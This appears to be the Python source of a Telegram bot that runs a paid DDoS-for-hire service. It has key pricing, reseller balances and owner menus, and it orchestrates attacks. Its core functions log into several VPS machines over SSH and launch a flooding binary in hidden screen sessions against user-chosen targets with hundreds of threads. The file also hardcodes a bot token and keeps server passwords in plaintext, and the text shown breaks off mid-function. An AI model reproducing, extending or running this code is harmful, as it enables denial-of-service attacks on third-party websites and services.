import os
import time
import logging
import re
import asyncio
import random
import json
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler, CallbackQueryHandler, ChatMemberHandler
from telegram.helpers import escape_markdown
import paramiko
from scp import SCPClient
import sys
import subprocess
from datetime import datetime
from pathlib import Path

# Suppress HTTP request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# Logging Configuration
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# --- Global Variables and Configuration ---
# (Keep existing global variables from the original file)
USER_VPS_SETTINGS = {}  # {user_id: vps_count}
USER_VPS_PREFERENCES = {}  # {user_id: preferred_vps_count}
GROUP_IMAGES = {}  # Store group images

# Bot management system
BOT_INSTANCES = {}
BOT_CONFIG_FILE = "bot_configs.json"
BOT_DATA_DIR = "bot_data"

# Image configuration
START_IMAGES = []
current_images = START_IMAGES
IMAGE_CONFIG_FILE = "image_config.json"
OFFICIAL_GROUP_NAME = ""

TELEGRAM_BOT_TOKEN = '7622864970:AAF5zpg202jB4m1XBKR6Bj02XGpQ3Rem8Ks'
OWNER_USERNAME = "Rajaraj909"
CO_OWNERS = []
OWNER_CONTACT = "Contact to buy keys"
ALLOWED_GROUP_IDS = [-1002834218110]
MAX_THREADS = 900
max_duration = 600
bot_open = False
SPECIAL_MAX_DURATION = 240
SPECIAL_MAX_THREADS = 2000
BOT_START_TIME = time.time()
DEFAULT_THREADS = 500

OWNER_ID = 7922553903
COOWNER_IDS = []
ACTIVE_VPS_COUNT = 6 # Default active VPS count

# Display Name Configuration
GROUP_DISPLAY_NAMES = {}
DISPLAY_NAME_FILE = "display_names.json"

# Link Management
LINK_FILE = "links.json"
LINKS = {}

# VPS Configuration
VPS_FILE = "vps.txt"
BINARY_NAME = "raja"
BINARY_PATH = f"/home/master/{BINARY_NAME}"
VPS_LIST = [] # Populated by load_vps()

# Key Prices (existing)
KEY_PRICES = {
    "1H": 5, "2H": 10, "3H": 15, "4H": 20, "5H": 25, "6H": 30, "7H": 35, "8H": 40, "9H": 45, "10H": 50,
    "1D": 60, "2D": 100, "3D": 160, "5D": 250, "7D": 320, "15D": 700, "30D": 1250, "60D": 2000,
}
SPECIAL_KEY_PRICES = {
    "1D": 70, "2D": 130, "3D": 250, "4D": 300, "5D": 400, "6D": 500, "7D": 550, "8D": 600, "9D": 750,
    "10D": 800, "11D": 850, "12D": 900, "13D": 950, "14D": 1000, "15D": 1050, "30D": 1500,
}

# Key System (existing)
keys = {}
special_keys = {}
redeemed_users = {}
redeemed_keys_info = {}
feedback_waiting = {}

# Reseller System (existing)
resellers = set()
reseller_balances = {}

# Global Cooldown (existing)
global_cooldown = 0
last_attack_time = 0

# Track running attacks
running_attacks = {} # {attack_id: {'user_id': ..., 'target': ..., 'vps_ips': [...]}}

# --- Utility Functions (existing) ---
def get_uptime():
    uptime_seconds = int(time.time() - BOT_START_TIME)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def load_image_config():
    global GROUP_IMAGES
    if os.path.exists(IMAGE_CONFIG_FILE):
        try:
            with open(IMAGE_CONFIG_FILE, 'r') as f:
                GROUP_IMAGES = json.load(f)
        except (json.JSONDecodeError, ValueError):
            GROUP_IMAGES = {'default': {'url': '', 'caption': ''}}
    else:
        GROUP_IMAGES = {'default': {'url': '', 'caption': ''}}

def get_display_name(group_id=None):
    base_name = GROUP_DISPLAY_NAMES.get(str(group_id) if group_id else 'default', f"✨ {OWNER_USERNAME} ✨")
    if group_id:
        return f"🌟 {base_name} 🌟 (Group Admin)"
    return f"👑 {base_name} 👑"

async def set_display_name(update: Update, new_name: str, group_id=None):
    if group_id is not None:
        GROUP_DISPLAY_NAMES[group_id] = new_name
    else:
        GROUP_DISPLAY_NAMES['default'] = new_name
    with open(DISPLAY_NAME_FILE, 'w') as f:
        json.dump(GROUP_DISPLAY_NAMES, f)
    if update:
        await update.message.reply_text(
            f"✅ Display name updated to: *{escape_markdown(new_name, version=2)}*" +
            (f" for group `{group_id}`" if group_id else " as default name"),
            parse_mode='MarkdownV2'
        )

def load_vps():
    global VPS_LIST
    VPS_LIST = []
    if os.path.exists(VPS_FILE):
        with open(VPS_FILE, 'r') as f:
            for line in f.readlines():
                line = line.strip()
                if line and len(line.split(',')) == 3:
                    VPS_LIST.append(line.split(',')) # IP,username,password

def save_resellers():
    data = {
        'resellers': list(resellers),
        'balances': reseller_balances
    }
    with open('resellers.json', 'w') as f:
        json.dump(data, f)

def load_resellers():
    if os.path.exists('resellers.json'):
        try:
            with open('resellers.json', 'r') as f:
                data = json.load(f)
                resellers.update(set(data.get('resellers', [])))
                reseller_balances.update(data.get('balances', {}))
        except (json.JSONDecodeError, ValueError):
            pass

def load_links():
    global LINKS
    if os.path.exists(LINK_FILE):
        try:
            with open(LINK_FILE, 'r') as f:
                LINKS = json.load(f)
        except (json.JSONDecodeError, ValueError):
            LINKS = {}

def save_links():
    with open(LINK_FILE, 'w') as f:
        json.dump(LINKS, f)

def load_display_name():
    global GROUP_DISPLAY_NAMES
    if os.path.exists(DISPLAY_NAME_FILE):
        try:
            with open(DISPLAY_NAME_FILE, 'r') as f:
                GROUP_DISPLAY_NAMES = json.load(f)
            new_dict = {}
            for k, v in GROUP_DISPLAY_NAMES.items():
                try:
                    if k != 'default':
                        new_dict[int(k)] = v
                    else:
                        new_dict[k] = v
                except ValueError:
                    new_dict[k] = v
            GROUP_DISPLAY_NAMES = new_dict
        except (json.JSONDecodeError, ValueError):
            GROUP_DISPLAY_NAMES = {'default': f"@{OWNER_USERNAME}"}
    else:
        GROUP_DISPLAY_NAMES = {'default': f"@{OWNER_USERNAME}"}

def load_keys():
    if not os.path.exists(KEY_FILE):
        return
    with open(KEY_FILE, "r") as file:
        for line in file:
            key_type, key_data = line.strip().split(":", 1)
            if key_type == "ACTIVE_KEY":
                parts = key_data.split(",")
                if len(parts) == 2:
                    key, expiration_time = parts
                    keys[key] = { 'expiration_time': float(expiration_time), 'generated_by': None }
                elif len(parts) == 3:
                    key, expiration_time, generated_by = parts
                    keys[key] = { 'expiration_time': float(expiration_time), 'generated_by': int(generated_by) }
            elif key_type == "REDEEMED_KEY":
                key, generated_by, redeemed_by, expiration_time = key_data.split(",")
                redeemed_users[int(redeemed_by)] = float(expiration_time)
                redeemed_keys_info[key] = { 'generated_by': int(generated_by), 'redeemed_by': int(redeemed_by) }
            elif key_type == "SPECIAL_KEY":
                key, expiration_time, generated_by = key_data.split(",")
                special_keys[key] = { 'expiration_time': float(expiration_time), 'generated_by': int(generated_by) }
            elif key_type == "REDEEMED_SPECIAL_KEY":
                key, generated_by, redeemed_by, expiration_time = key_data.split(",")
                redeemed_users[int(redeemed_by)] = { 'expiration_time': float(expiration_time), 'is_special': True }
                redeemed_keys_info[key] = { 'generated_by': int(generated_by), 'redeemed_by': int(redeemed_by), 'is_special': True }

def save_keys():
    with open(KEY_FILE, "w") as file:
        for key, key_info in keys.items():
            if key_info['expiration_time'] > time.time():
                file.write(f"ACTIVE_KEY:{key},{key_info['expiration_time']},{key_info['generated_by']}\n")
        for key, key_info in special_keys.items():
            if key_info['expiration_time'] > time.time():
                file.write(f"SPECIAL_KEY:{key},{key_info['expiration_time']},{key_info['generated_by']}\n")
        for key, key_info in redeemed_keys_info.items():
            if key_info['redeemed_by'] in redeemed_users:
                if 'is_special' in key_info and key_info['is_special']:
                    file.write(f"REDEEMED_SPECIAL_KEY:{key},{key_info['generated_by']},{key_info['redeemed_by']},{redeemed_users[key_info['redeemed_by']]['expiration_time']}\n")
                else:
                    file.write(f"REDEEMED_KEY:{key},{key_info['generated_by']},{key_info['redeemed_by']},{redeemed_users[key_info['redeemed_by']]}\n")

def load_bot_configs():
    if not os.path.exists(BOT_CONFIG_FILE):
        return []
    try:
        with open(BOT_CONFIG_FILE, 'r') as f:
            configs = json.load(f)
            if not isinstance(configs, list):
                logging.error("Invalid bot configs format, resetting to empty list")
                return []
            return configs
    except (json.JSONDecodeError, ValueError, IOError) as e:
        logging.error(f"Error loading bot configs: {e}")
        return []

def save_bot_configs(configs):
    try:
        with open(BOT_CONFIG_FILE, 'w') as f:
            json.dump(configs, f, indent=2)
    except (json.JSONDecodeError, ValueError, IOError) as e:
        logging.error(f"Error saving bot configs: {e}")

def save_vps():
    with open(VPS_FILE, 'w') as f:
        for vps in VPS_LIST:
            f.write(','.join(vps) + '\n')

def is_allowed_group(update: Update):
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id in ALLOWED_GROUP_IDS

def is_owner(update: Update):
    # This checks username, consider changing to ID for robustness
    return update.effective_user.username == OWNER_USERNAME or update.effective_user.id == OWNER_ID

def is_co_owner(update: Update):
    return update.effective_user.id in CO_OWNERS or update.effective_user.id in COOWNER_IDS

def is_reseller(update: Update):
    return update.effective_user.id in resellers

def is_authorized_user(update: Update):
    return is_owner(update) or is_co_owner(update) or is_reseller(update)

def get_random_start_image():
    return random.choice(START_IMAGES)

async def reset_vps(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only owner or co-owners can reset VPS!*", parse_mode='Markdown')
        return
    global running_attacks
    busy_count = len(running_attacks)
    if busy_count == 0:
        await update.message.reply_text("ℹ️ *No VPS are currently busy.*", parse_mode='Markdown')
        return
    running_attacks.clear()
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    await update.message.reply_text(
        f"✅ *Reset {busy_count} busy VPS - they are now available for new attacks!*\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )

async def add_bot_instance(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can add bot instances!", parse_mode='Markdown')
        return ConversationHandler.END
    await update.message.reply_text(
        "⚠️ *Enter the new bot token:*\n\n"
        "Format: `1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ`",
        parse_mode='MarkdownV2'
    )
    return GET_BOT_TOKEN

async def set_new_group_name(update: Update, context: CallbackContext):
    global OFFICIAL_GROUP_NAME
    new_name = update.message.text.strip()
    for image in current_images:
        if 'caption' in image:
            image['caption'] = image['caption'].replace(OFFICIAL_GROUP_NAME, new_name)
    OFFICIAL_GROUP_NAME = new_name
    save_image_config()
    await update.message.reply_text(
        f"✅ Official group name changed to: *{escape_markdown(new_name, version=2)}*\n"
        "All image captions have been updated\\.",
        parse_mode='MarkdownV2'
    )
    return ConversationHandler.END

async def show_users(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can check users!*", parse_mode='Markdown')
        return
    try:
        owner_info = f"👑 *Owner*: {escape_markdown(OWNER_USERNAME, version=2)}"
        
        co_owners_info = []
        for co_owner_id in COOWNER_IDS:
            try:
                co_owner_chat = await context.bot.get_chat(co_owner_id)
                co_owners_info.append(
                    f"🔹 *Co-Owner*: {escape_markdown(co_owner_chat.full_name, version=2)} "
                    f"(`@{escape_markdown(co_owner_chat.username, version=2)}`)"
                )
            except Exception as e:
                co_owners_info.append(f"🔹 *Co-Owner*: ID `{co_owner_id}` \(Could not fetch details\)")

        resellers_info = []
        for reseller_id in resellers:
            try:
                reseller_chat = await context.bot.get_chat(reseller_id)
                balance = reseller_balances.get(reseller_id, 0)
                resellers_info.append(
                    f"🔸 *Reseller*: {escape_markdown(reseller_chat.full_name, version=2)} "
                    f"(`@{escape_markdown(reseller_chat.username, version=2)}`) \- Balance: `{balance}` coins"
                )
            except Exception as e:
                resellers_info.append(f"🔸 *Reseller*: ID `{reseller_id}` \(Could not fetch details\)")

        message_parts = [
            "📊 *User Information*", "", owner_info, "",
            "*Co-Owners:*", *(co_owners_info if co_owners_info else ["_None_"]), "",
            "*Resellers:*", *(resellers_info if resellers_info else ["_None_"])
        ]
        message = "\n".join(message_parts)

        if len(message) > 4000:
            parts = [message[i:i+4000] for i in range(0, len(message), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode='MarkdownV2')
        else:
            await update.message.reply_text(message, parse_mode='MarkdownV2')

    except Exception as e:
        logging.error(f"Error in show_users: {str(e)}", exc_info=True)
        await update.message.reply_text(
            "❌ *An error occurred while fetching user information\\.*",
            parse_mode='MarkdownV2'
        )

async def change_image_link(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner or co-owners can change image links!", parse_mode='Markdown')
        return ConversationHandler.END
    await update.message.reply_text(
        f"⚠️ Current image URL: `{escape_markdown(current_images[0]['url'], version=2) if current_images else 'Not set'}`\n"
        "Enter the new image URL (must start with http:// or https://):",
        parse_mode='MarkdownV2'
    )
    return GET_NEW_IMAGE_URL

async def set_new_image_url(update: Update, context: CallbackContext):
    new_url = update.message.text.strip()
    if not (new_url.startswith('http://') or new_url.startswith('https://')):
        await update.message.reply_text("❌ Invalid URL! Must start with http:// or https://")
        return ConversationHandler.END
    if current_images:
        current_images[0]['url'] = new_url
    else:
        current_images.append({'url': new_url, 'caption': ''})
    save_image_config()
    await update.message.reply_text(
        f"✅ Image URL updated successfully!\n"
        f"New URL: `{escape_markdown(new_url, version=2)}`",
        parse_mode='MarkdownV2'
    )
    return ConversationHandler.END

async def change_group_name(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner or co-owners can change the group name!", parse_mode='Markdown')
        return ConversationHandler.END
    await update.message.reply_text(
        f"⚠️ Current official group name: *{escape_markdown(OFFICIAL_GROUP_NAME, version=2) if OFFICIAL_GROUP_NAME else 'Not set'}*\n"
        "Enter the new official group name:",
        parse_mode='MarkdownV2'
    )
    return GET_NEW_GROUP_NAME

async def handle_photo(update: Update, context: CallbackContext):
    # This handler seems to be for setting group images
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can set group images!", parse_mode='Markdown')
        return ConversationHandler.END

    if 'set_group_image_waiting' in context.user_data and context.user_data['set_group_image_waiting']:
        group_id = context.user_data['set_group_image_for_group']
        file_id = update.message.photo[-1].file_id # Get the largest photo
        caption = update.message.caption or ""

        GROUP_IMAGES[str(group_id)] = {'url': file_id, 'caption': caption, 'type': 'photo_id'}
        save_image_config()
        await update.message.reply_text(f"✅ Image set for group `{group_id}`!", parse_mode='MarkdownV2')
        context.user_data.pop('set_group_image_waiting')
        context.user_data.pop('set_group_image_for_group')
        return ConversationHandler.END
    # If not in the "set group image" state, just ignore or add a default response
    await update.message.reply_text("📸 Photo received. Use `/setgroupimage` to assign it to a group.", parse_mode='Markdown')
    return ConversationHandler.END # Or NO_CHANGE

async def get_group_image(group_id):
    group_id = str(group_id)
    if group_id in GROUP_IMAGES:
        return GROUP_IMAGES[group_id]
    return GROUP_IMAGES.get('default', {'url': '', 'caption': '', 'type': 'url'})

async def set_group_image_handler(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can set group images!", parse_mode='Markdown')
        return
    await update.message.reply_text(
        "🖼️ *Set Group Image*\n\n"
        "Please forward a photo to me, or send a photo and reply to it with the target group ID\. If you want to set the default image, just send a photo without a group ID\.",
        parse_mode='MarkdownV2'
    )
    context.user_data['set_group_image_waiting'] = True
    context.user_data['set_group_image_for_group'] = None # Default to global if no group ID provided
    return ConversationHandler.END # This needs to be GET_GROUP_IMAGE_OR_ID in a real convo handler

async def set_group_link_handler(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can set group links!", parse_mode='Markdown')
        return
    await update.message.reply_text(
        "🔗 *Set Group Link*\n\n"
        "Please reply with the group ID and the new invite link in the format:\n"
        "`<group_id> <invite_link>`\n\n"
        "Example: `-1234567890 https://t.me/yourgroup`",
        parse_mode='MarkdownV2'
    )
    return GET_GROUP_LINK # New conversation state needed

async def get_group_link_input(update: Update, context: CallbackContext):
    text = update.message.text.strip()
    parts = text.split(' ', 1)
    if len(parts) < 2:
        await update.message.reply_text("❌ Invalid format. Please use `<group_id> <invite_link>`", parse_mode='MarkdownV2')
        return ConversationHandler.END
    
    try:
        group_id = int(parts[0])
        invite_link = parts[1]
        
        if not (invite_link.startswith('http://') or invite_link.startswith('https://') or invite_link.startswith('t.me/')):
            await update.message.reply_text("❌ Invalid link format\\. Link must start with `http://`, `https://` or `t.me/`", parse_mode='MarkdownV2')
            return ConversationHandler.END

        # Store group link in a global dictionary, e.g., GROUP_LINKS = {group_id: link}
        if 'GROUP_LINKS' not in globals():
            global GROUP_LINKS
            GROUP_LINKS = {}
        GROUP_LINKS[group_id] = invite_link
        
        # You might want to save this to a file
        # with open('group_links.json', 'w') as f:
        #     json.dump(GROUP_LINKS, f)

        await update.message.reply_text(
            f"✅ Group link set for group `{group_id}` to `{escape_markdown(invite_link, version=2)}`",
            parse_mode='MarkdownV2'
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid group ID. Please make sure it's a number.", parse_mode='MarkdownV2')
    except Exception as e:
        logging.error(f"Error setting group link: {e}")
        await update.message.reply_text("⚠️ An error occurred while setting the group link.", parse_mode='MarkdownV2')
    return ConversationHandler.END

# --- Authorization and Access Control (existing) ---
def is_owner_id(user_id: int) -> bool:
    return user_id == OWNER_ID

def is_coowner_id(user_id: int) -> bool:
    return user_id in COOWNER_IDS

def is_reseller_id(user_id: int) -> bool:
    return user_id in resellers

# --- Keyboards (existing and modified for dynamic buttons) ---
group_user_keyboard = [
    ['/start', 'Attack'],
    ['Redeem Key', 'Rules'],
    ['🔍 Status', '⏳ Uptime']
]
group_user_markup = ReplyKeyboardMarkup(group_user_keyboard, resize_keyboard=True)

reseller_keyboard = [
    ['/start', 'Attack', 'Redeem Key'],
    ['Rules', 'Balance', 'Generate Key'],
    ['⏳ Uptime', 'Add VPS']
]
reseller_markup = ReplyKeyboardMarkup(reseller_keyboard, resize_keyboard=True)

settings_keyboard = [
    ['Set Duration', 'Add Reseller'],
    ['Remove Reseller', 'Set Threads'],
    ['Add Coin', 'Set Cooldown'],
    ['Reset VPS', 'Back to Home']
]
settings_markup = ReplyKeyboardMarkup(settings_keyboard, resize_keyboard=True)

owner_settings_keyboard = [
    ['Add Bot', 'Remove Bot'],
    ['Bot List', 'Start Selected Bot'],
    ['Stop Selected Bot', 'Promote'],
    ['🔗 Manage Links', '📢 Broadcast'],
    ['🖼️ Set Group Image', '🔗 Set Group Link'],
    ['Back to Home']
]
owner_settings_markup = ReplyKeyboardMarkup(owner_settings_keyboard, resize_keyboard=True)

owner_keyboard = [
    ['/start', 'Attack', 'Redeem Key'],
    ['Rules', 'Settings', 'Generate Key'],
    ['Delete Key', '🔑 Special Key', '⏳ Uptime'],
    ['OpenBot', 'CloseBot', 'Menu'],
    ['⚙️ Owner Settings', '👥 Check Users']
]
owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)

co_owner_keyboard = [
    ['/start', 'Attack', 'Redeem Key'],
    ['Rules', 'Balance', 'Generate Key'],
    ['⏳ Uptime', 'Add VPS']
]
co_owner_markup = ReplyKeyboardMarkup(co_owner_keyboard, resize_keyboard=True)

owner_menu_keyboard = [
    ['Add Group ID', 'Remove Group ID'],
    ['RE Status', 'VPS Status'],
    ['Add VPS', 'Remove VPS'],
    ['Add Co-Owner', 'Remove Co-Owner'],
    ['Set Display Name', 'Upload Binary'],
    ['Delete Binary', 'Back to Home']
]
owner_menu_markup = ReplyKeyboardMarkup(owner_menu_keyboard, resize_keyboard=True)

co_owner_menu_keyboard = [
    ['Add Group ID', 'Remove Group ID'],
    ['RE Status', 'VPS Status'],
    ['Set Display Name', 'Add VPS'],
    ['Back to Home', 'Upload Binary']
]
co_owner_menu_markup = ReplyKeyboardMarkup(co_owner_menu_keyboard, resize_keyboard=True)

# --- Conversation States (add new states) ---
GET_DURATION = 1
GET_KEY = 2
GET_ATTACK_ARGS = 3
GET_SET_DURATION = 4
GET_SET_THREADS = 5
GET_DELETE_KEY = 6
GET_RESELLER_ID = 7
GET_REMOVE_RESELLER_ID = 8
GET_ADD_COIN_USER_ID = 9
GET_ADD_COIN_AMOUNT = 10
GET_SET_COOLDOWN = 11
GET_SPECIAL_KEY_DURATION = 12
GET_SPECIAL_KEY_FORMAT = 13
ADD_GROUP_ID = 14
REMOVE_GROUP_ID = 15
MENU_SELECTION = 16
GET_RESELLER_INFO = 17
GET_VPS_INFO = 18
GET_VPS_TO_REMOVE = 19
CONFIRM_BINARY_UPLOAD = 20
GET_ADD_CO_OWNER_ID = 21
GET_REMOVE_CO_OWNER_ID = 22
GET_DISPLAY_NAME = 23
GET_GROUP_FOR_DISPLAY_NAME = 24
GET_BOT_TOKEN = 25
GET_OWNER_USERNAME = 26
SELECT_BOT_TO_START = 27
SELECT_BOT_TO_STOP = 28
CONFIRM_BINARY_DELETE = 29
GET_LINK_NUMBER = 30
GET_LINK_URL = 31
GET_VPS_COUNT = 32
GET_NEW_IMAGE_URL = 33
GET_NEW_GROUP_NAME = 34
GET_BROADCAST_MESSAGE = 35
GET_GROUP_LINK = 36 # New state for setting group link
GET_KEY_TYPE = 37
GET_MULTI_VPS_COUNT = 38 # New state for selecting number of VPS for attack

# --- Core Logic for Multi-VPS Attacks ---

async def execute_attack_on_vps(vps_ip: str, vps_user: str, vps_pass: str, target_url: str, duration: int, threads: int, attack_id: str) -> dict:
    """Executes a DDoS attack command on a single VPS via SSH."""
    client = None
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=vps_ip, username=vps_user, password=vps_pass, timeout=10)

        # Ensure the binary exists and is executable
        stdin, stdout, stderr = client.exec_command(f"test -f {BINARY_PATH} && test -x {BINARY_PATH}; echo $?")
        exit_status = stdout.read().decode().strip()
        if exit_status != '0':
            logging.error(f"Binary {BINARY_PATH} not found or not executable on {vps_ip}")
            return {"vps": vps_ip, "status": "❌ Binary not found/executable"}

        # Construct the attack command
        command = f"{BINARY_PATH} {target_url} {duration} {threads}"
        logging.info(f"Executing command on {vps_ip}: {command}")

        # Execute the command in a screen session to detach
        screen_session_name = f"attack_{attack_id}_{vps_ip.replace('.', '_')}"
        full_command = f"screen -dmS {screen_session_name} {command}"

        stdin, stdout, stderr = client.exec_command(full_command)
        error_output = stderr.read().decode().strip()

        if error_output:
            logging.error(f"Error starting attack on {vps_ip}: {error_output}")
            return {"vps": vps_ip, "status": f"❌ Failed to start: {error_output}"}
        else:
            logging.info(f"Attack started successfully on {vps_ip} in screen '{screen_session_name}'")
            return {"vps": vps_ip, "status": "✅ Attack started"}

    except paramiko.AuthenticationException:
        logging.error(f"Authentication failed for {vps_user}@{vps_ip}")
        return {"vps": vps_ip, "status": "❌ Auth failed"}
    except paramiko.SSHException as e:
        logging.error(f"SSH error on {vps_ip}: {e}")
        return {"vps": vps_ip, "status": f"❌ SSH error: {e}"}
    except Exception as e:
        logging.error(f"Unexpected error on {vps_ip}: {e}")
        return {"vps": vps_ip, "status": f"❌ Error: {e}"}
    finally:
        if client:
            client.close()

async def stop_attack_on_vps(vps_ip: str, vps_user: str, vps_pass: str, attack_id: str) -> dict:
    """Stops the attack process on a single VPS."""
    client = None
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=vps_ip, username=vps_user, password=vps_pass, timeout=10)

        # Find and kill the screen session or the process
        screen_session_name = f"attack_{attack_id}_{vps_ip.replace('.', '_')}"
        
        # Attempt to kill the screen session
        stdin, stdout, stderr = client.exec_command(f"screen -S {screen_session_name} -X quit")
        stderr_output_screen = stderr.read().decode().strip()

        # If screen command fails (e.g., session not found), try killing by binary name
        if "No screen session found" in stderr_output_screen or "No such session" in stderr_output_screen or stderr_output_screen:
            logging.warning(f"Screen session '{screen_session_name}' not found or error on {vps_ip}. Attempting to kill binary directly.")
            stdin, stdout, stderr = client.exec_command(f"pkill -f {BINARY_NAME}")
            stderr_output_pkill = stderr.read().decode().strip()
            if stderr_output_pkill:
                logging.error(f"Error killing binary on {vps_ip}: {stderr_output_pkill}")
                return {"vps": vps_ip, "status": f"⚠️ Failed to stop (pkill error): {stderr_output_pkill}"}
            else:
                return {"vps": vps_ip, "status": "✅ Stopped (via pkill)"}
        else:
            return {"vps": vps_ip, "status": "✅ Stopped (via screen quit)"}

    except paramiko.AuthenticationException:
        logging.error(f"Authentication failed for {vps_user}@{vps_ip} during stop.")
        return {"vps": vps_ip, "status": "❌ Stop Failed (Auth)"}
    except paramiko.SSHException as e:
        logging.error(f"SSH error on {vps_ip} during stop: {e}")
        return {"vps": vps_ip, "status": f"❌ Stop Failed (SSH Error: {e})"}
    except Exception as e:
        logging.error(f"Unexpected error during stop on {vps_ip}: {e}")
        return {"vps": vps_ip, "status": f"❌ Stop Failed (Error: {e})"}
    finally:
        if client:
            client.close()

async def start_multi_vps_attack(update: Update, context: CallbackContext, target_url: str, duration: int, threads: int, num_vps_to_use: int):
    """
    Orchestrates launching DDoS attacks on multiple selected VPS concurrently.
    """
    user_id = update.effective_user.id
    if not VPS_LIST:
        await update.message.reply_text("❌ *No VPS are configured!* Please add VPS first using the `/addvps` command.", parse_mode='MarkdownV2')
        return

    # Ensure num_vps_to_use is valid and clamped
    num_vps_to_use = min(num_vps_to_use, len(VPS_LIST))
    if num_vps_to_use <= 0:
        await update.message.reply_text("❌ *Invalid VPS count selected!* Please choose at least 1 VPS.", parse_mode='MarkdownV2')
        return

    # Randomly select VPS
    selected_vps = random.sample(VPS_LIST, num_vps_to_use)
    vps_ips = [vps[0] for vps in selected_vps]
    attack_id = f"ATTK_{user_id}_{int(time.time())}" # Unique ID for this multi-VPS attack

    running_attacks[attack_id] = {
        'user_id': user_id,
        'target': target_url,
        'duration': duration,
        'threads': threads,
        'vps_ips': vps_ips,
        'start_time': time.time(),
        'status': 'Launching'
    }

    await update.message.reply_text(
        f"🚀 *Launching Attack on {num_vps_to_use} VPS...*\n\n"
        f"🎯 *Target*: `{escape_markdown(target_url, version=2)}`\n"
        f"⏳ *Duration*: `{duration}` seconds\n"
        f"🧵 *Threads*: `{threads}`\n\n"
        f"Selected VPS IPs:\n`{'`, `'.join(vps_ips)}`\n\n"
        "Please wait for results...",
        parse_mode='MarkdownV2'
    )

    tasks = []
    for vps_ip, vps_user, vps_pass in selected_vps:
        tasks.append(execute_attack_on_vps(vps_ip, vps_user, vps_pass, target_url, duration, threads, attack_id))

    results = await asyncio.gather(*tasks, return_exceptions=True)

    success_vps = []
    failed_vps = []
    for res in results:
        if isinstance(res, dict) and res.get("status", "").startswith("✅"):
            success_vps.append(res["vps"])
        elif isinstance(res, dict):
            failed_vps.append(f"{res['vps']} \({res['status'].replace('❌ ', '')}\)") # Format for failed
        else:
            logging.error(f"Unexpected result type from execute_attack_on_vps: {res}")
            failed_vps.append(f"Unknown VPS \(Error: {res}\)")

    # Update global running_attacks with actual success/failure
    if success_vps:
        running_attacks[attack_id]['vps_ips'] = success_vps # Only keep successfully launched VPS
        running_attacks[attack_id]['status'] = 'Running'
    else:
        # If no VPS started successfully, remove the attack entry
        if attack_id in running_attacks:
            del running_attacks[attack_id]
        
    # Build a stylish results message
    results_message_parts = [f"✨ *Attack Launch Report for* `{escape_markdown(target_url, version=2)}` ✨\n"]

    if success_vps:
        results_message_parts.append(f"🟢 *Successfully launched on {len(success_vps)} VPS:*\n`{'`, `'.join(success_vps)}`")
    if failed_vps:
        results_message_parts.append(f"🔴 *Failed to launch on {len(failed_vps)} VPS:*\n`{'`, `'.join(failed_vps)}`")
    
    if not success_vps and not failed_vps:
        results_message_parts.append("⚠️ *No VPS were processed for the attack.* This might indicate an internal error or no VPS available.")
    
    results_message_parts.append("\n_You can check running attacks with /running and stop them with /stop_")

    await update.message.reply_text(
        "\n".join(results_message_parts),
        parse_mode='MarkdownV2'
    )

async def stop_attack_cmd(update: Update, context: CallbackContext):
    """Allows authorized users to stop a running attack."""
    if not is_authorized_user(update):
        await update.message.reply_text("❌ *You are not authorized to stop attacks!*", parse_mode='MarkdownV2')
        return

    if not running_attacks:
        await update.message.reply_text("ℹ️ *No attacks are currently running\\.*", parse_mode='MarkdownV2')
        return

    # Create dynamic buttons for running attacks
    keyboard = []
    for attack_id, info in running_attacks.items():
        user = (await context.bot.get_chat(info['user_id'])).full_name if info['user_id'] else "Unknown User"
        keyboard.append([InlineKeyboardButton(f"🛑 Stop {info['target']} by {user}", callback_data=f"stop_attack_{attack_id}")])

    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "🚨 *Select an attack to stop:*\n\n"
        "_Note: Stopping an attack might take a few moments\\._",
        reply_markup=reply_markup,
        parse_mode='MarkdownV2'
    )

async def handle_stop_attack_callback(update: Update, context: CallbackContext):
    """Handles callback queries for stopping attacks."""
    query = update.callback_query
    await query.answer() # Acknowledge the callback

    attack_id = query.data.replace("stop_attack_", "")
    user_id = query.from_user.id

    if attack_id not in running_attacks:
        await query.edit_message_text("❌ *This attack is no longer running or has already been stopped\\!*", parse_mode='MarkdownV2')
        return

    attack_info = running_attacks[attack_id]
    
    # Check if the user is authorized to stop this specific attack
    # Owner/co-owner can stop any. Reseller can only stop their own.
    if not is_owner_id(user_id) and not is_coowner_id(user_id) and attack_info['user_id'] != user_id:
        await query.edit_message_text("🚫 *You are not authorized to stop this attack!*", parse_mode='MarkdownV2')
        return

    target_url = attack_info['target']
    vps_ips_to_stop = attack_info['vps_ips']
    
    await query.edit_message_text(
        f"⏳ *Attempting to stop attack on* `{escape_markdown(target_url, version=2)}` *on {len(vps_ips_to_stop)} VPS...*\n"
